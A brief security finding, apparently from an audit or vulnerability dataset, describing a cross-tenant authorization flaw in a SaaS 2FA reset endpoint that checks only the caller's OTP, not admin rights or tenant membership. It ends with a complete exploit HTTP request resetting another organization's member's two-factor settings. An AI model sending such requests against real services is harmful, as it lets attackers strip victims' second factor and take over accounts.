diagnosis: The tenant team member 2FA reset route checks the caller's OTP code, but fails to check whether the caller has administrator privileges in tenantId or whether memberId belongs to tenantId. Any authenticated user with 2FA enabled can reset the two-factor authentication configuration of members across other organizations.
exploit_request:
POST /api/tenants/org_foreign_corp_102/members/usr_lead_dev_551/reset-2fa HTTP/1.1
Host: console.saas.internal:6008
Authorization: Bearer <member_token_other_tenant>
Content-Type: application/json

{
  "adminOtpCode": "339182"
}
